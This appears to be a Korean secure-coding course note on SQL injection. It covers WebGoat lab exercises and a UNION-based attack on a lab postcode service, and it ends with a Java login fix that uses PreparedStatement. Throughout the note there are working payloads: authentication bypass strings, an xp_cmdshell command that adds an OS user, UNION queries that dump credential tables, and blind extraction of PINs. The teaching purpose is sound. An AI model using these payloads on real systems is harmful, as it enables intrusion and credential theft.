# CH4. 보안취약점 제거를 위한 코딩 기법

### ❗️SQL Injection 공격 유형❗️

1. **항상 참이 되는 입력** => 모든 내용이 반환됨 = 권한 밖의 데이터에 대해 조회접근 및 조회가 가능해진다.

   ​	=> search.jsp?text=’abcd’ or ‘a’=’a

   ​	=> `select * from data where keyword='abcd' or 'a'='a'`

   ***실습***

   1) String SQL Injection

   - @WinXP > Paros 실행 후 IE 브라우저로 WebGoat 사이트로 접속 ⇒ http://192.168.49.1:8080/WebGoat (webgoat / webgoat) > Injection Flaws > **String SQL Injection** 메뉴로 이동

   - 사용자 계좌(계정)의 유효성을 체크해주는 서비스

   2) Numeric SQL Injection

   - 문제 : 모든 지역의 날씨 정보를 출력하기

   - 전달 : …/search.jsp?station=102

   - 처리 : `select * from weather where station=102`

   - 정답 : 

     - URL 주소의 요청 파라미터를 수정해서 직접 호출

       http://192.168.49.1:8080/WebGoat/attack?Screen=75&menu=1100&station=102 or 1=1

     - Proxy를 이용해서 요청 파라미터를 수정해서 호출하는 방법station=102 or 1=1&SUBMIT=Go%21

     - 브라우저의 개발자 도구를 이용해서 값을 변경 후 서버로 전달

   3) String SQL Injection

   - 문제: Neville 사용자로 로그인하기

   - 화면 : 사용자 : Neville->employee_id 파라미터의 값으로 112가 선택

     ​         password : ???

   - 전달 : …/login.jsp?employee_id=112&password='???'

   - 처리 : `select * from users where employee_id=112 and password='???'`

   - 정답 : 

     - `a' or 'a' = 'a ` 라고 password입력창에 입력하면 로그인 가능

       =>브라우저의 개발자 도구를 이용해서 클라이언트의 제약조건을 해제 후 공격 문자열을 입력,전달 한다.

       => maxLength의 값을 수정

     - proxy를 이용해서 전달값 수정 (전통적인 방법)

     

     4) 로그인 소스코드 수정

   ```java
   	public boolean login(WebSession s, String userId, String password)
   	{
   		boolean authenticated = false;
   		try
   		{
   /************************************ 진단결과 ************************************/			
   //			// 외부 입력값 userId와 password를 검증하지 않고,
   //			// SQL 문 생성 및 실행에 사용하고 있다. => SQL Injection 취약점이 존재
   //
   //			// 안전한 코드로 변경하는 방법 
   //			// 쿼리문의 구조를 정의하고, 정의된 형태로만 실행되는 것을 보장
   //			// = 파라미터화된 쿼리 실행 = 구조화된 쿼리 실행
   //			// = PreparedStatement 객체를 이용해서 쿼리를 실행
   //			String query = "SELECT * FROM employee WHERE userid = " + userId + " and password = '" + password + "'";
   //			try
   //			{
   //				Statement answer_statement = WebSession.getConnection(s)
   //						.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
   //				ResultSet answer_results = answer_statement.executeQuery(query);
   
   /******************************#1 쿼리문의 구조를 정의******************************/
   			// 	  변수 부분(입력값이 들어가는 부분)을 물음표(?)로 마킹
   			//    해당 컬럼의 데이터 타입을 고려하지 않음
   			String query = "SELECT * FROM employee WHERE userid = ? and password = ? ";
   			try
   			{
   /******************#2 Statement 객체를 PreparedStatement 객체로 변경******************/
   				//    PreparedStatement 객체를 생성
   				//    prepareStatement() 메소드를 이용해서 생성하고,
   				//    파라미터로 쿼리문의 구조를 전달
   				java.sql.PreparedStatement answer_statement = WebSession.getConnection(s)
   						.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
   				
   /****************************#3 변수에 값을 바인딩 후 쿼리를 실행****************************/
   				//    해당 컬럼의 데이터 타입을 고려해서 바인딩 함수를 사용
   				answer_statement.setInt(1, Integer.parseInt(userId));
   				answer_statement.setString(2, password);
   				ResultSet answer_results = answer_statement.executeQuery();
   				
   				if (answer_results.first())
   				{
   					setSessionAttribute(s, getLessonName() + ".isAuthenticated", Boolean.TRUE);
   					setSessionAttribute(s, getLessonName() + "." + SQLInjection.USER_ID, userId);
   					authenticated = true;
   				}
   			} catch (SQLException sqle)
   			{
   				s.setMessage("Error logging in");
   				sqle.printStackTrace();
   			}
   		} catch (Exception e)
   		{
   			s.setMessage("Error logging in");
   			e.printStackTrace();
   		}
   
   		// System.out.println("Lesson login result: " + authenticated);
   		return authenticated;
   	}
   ```

   

2. **오류를 유발하는 입력**  => 추가 공격을 위한 정보 수입

   ​	=> search.jsp?text=abcd’

   ​	=> `select * from data where keyword=’abcd’` 

   ​	=> 홑따움표의 개수가 일치하지 않아서 오류가 발생 -> 오류

   ​	=> 메세지에 대한 처리가 불완전하여 시스템 내부 정보가 사용자 화면에 출력될 수 있음.

   

3. **Stored Procedure를 호출하는 입력** => DB 서버의 제어권 탈취에 사용될 수 있다.

   ​	=> search.jsp?text=abcd'; exec xp_cmdshell 'net user hack hack /add'; --

   ​	=> `select * from data where keyword= 'abcd'; exec xp_cmdshell' net user hack hack /add'; —'`

4.  UNION 구문을 이용한 호출 => 

   ​	기존 쿼리

   ​	=> `select * from address where dong = '하대동'`

   ​	공격자가 원하는 쿼리

   ​	=> `select * from address where dong='하대동' UNION select * from user --`

   ***실습***

   - 문제 : LAB 우편번호 조회 서비스를 이용해서 해당 사이트( [http://70.12.50.56:9090](http://70.12.50.56:9090/zipcode.asp))의 계정을 탈취해서 로그인해 보세요.

     - **\#1** **우편번호 조회 서비스를 통해서 반환하는 컬럼의 갯수를 확인**

       ​	->`select * from address where dong='a'order by 1 --`  //1번째 컬럼을 기준으로 정렬하시오.

       ​	=> …/zip_code.asp?dong=a
       ​	

       ​	->`select * from address where dong=a' order by 8 —` //8번째 컬럼을 기준으로 정렬하시오 했는데

       ​	->에러메세지 출력

       ```
       Microsoft OLE DB Provider for SQL Server 오류 '80040e14'
       ORDER BY 위치 번호 8이(가) SELECT 목록의 항목 번호 범위를 벗어났습니다.
       /zip_search.asp, 줄 21
       
       → 우편번호 조회 서비스를 위한 쿼리는 7개의 컬럼을 반환한다.
       ⇒ Error-Based SQL Injection
       ```

     -  **\#2 UNION 구문을 이용해서 숫자로 구성된 7개의 값을 출력**

       ​	-> `select * from address where dong = 'a' UNION select 1,2,3,4,5,6,7 --' `

       ​	⇒ .../zip_code.asp?dong=a' UNION select 1,2,3,4,5,6,7 --

       ​	->에러메세지 출력

       ```
       Microsoft OLE DB Provider for SQL Server 오류 '80040e07'
       varchar 값 '110-753'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
       /zip_search.asp, 줄 21
       ```

     -  **\#3 UNION 구문을 이용해서 해당 DBMS의 종류를 확인**

       ​	=> select * from address where dong = 'a' and 1=2 UNION select 1,db_name(),@@version,4,5,6,7 --

     -  **\#4 MS-SQL의 시스템 테이블을 이용해서 해당 DB에서 사용하고 있는 사용자 테이블 목록을 조회**

       ​	=> `select * from address where dong = 'a' and 1=2 UNION select 1,id,name,4,5,6,7 from sysobjects where xtype='U' --' `

     -  **\#5 member 테이블의 컬럼 정보(이름)를 조회**

       ​	=>`select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=2073058421 --'`

       ​	=>`select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=(select id from sysobjects where name='member') --' `

     -  **\#6 member 테이블에 정보를 조회**

        =>`select * from address where dong = 'a' and 1=2 UNION select 1,bId,bName,bPass,bMail,bPhone,7 from member --'`

5. **Blind SQL Injection** => 참,거짓에 따라 서버의 반응이 다른것을 이용한 공격 기법

   WebGoat > Injection Flaws > Blind Numeric SQL Injection 

   서버 내부 처리를 예측

   `select * from accounts where account_no=101`

   ​	->	결과가 있으면 => Account number is valid.

   ​	->	결과가 없으면 => Invalid account number.

   - 문제1 : pins 테이블에서 cc_number의 값이 1111222233334444인 pin 값을 구하시오.

     ​	=> `select pin from pins where cc_number = '1111222233334444'`

     -> `select * from accounts where account_no = 101 and (select pin from pins where cc_number = '1111222233334444') = 2364`

     ​	=> Account number is valid. ⇒ 참

     ​	=> Invalid account number. ⇒ 거짓

   - 문제2 : pins 테이블에서 cc_number의 값이 4321432143214321인 name 컬럼의 값을 구하시오.

     ​	=> `select * from accounts where account_no = 101 and (select substr(name,1,1) from pins where cc_number = '4321432143214321') = 'J'`

     ​	=> `select * from accounts where account_no = 101 and (select ascii(substr(name,1,1)) from pins where cc_number = '4321432143214321') < 90`

     ​	=> `select * from accounts where account_no = 101 and (select substr(name,2,1) from pins where cc_number = '4321432143214321') = 'i'`

     ​	=> `select * from accounts where account_no = 101 and (select substr(name,3,1) from pins where cc_number = '4321432143214321') = 'l'`

     ​	=> `select * from accounts where account_no = 101 and (select name from pins where cc_number = '4321432143214321') = 'Jill'`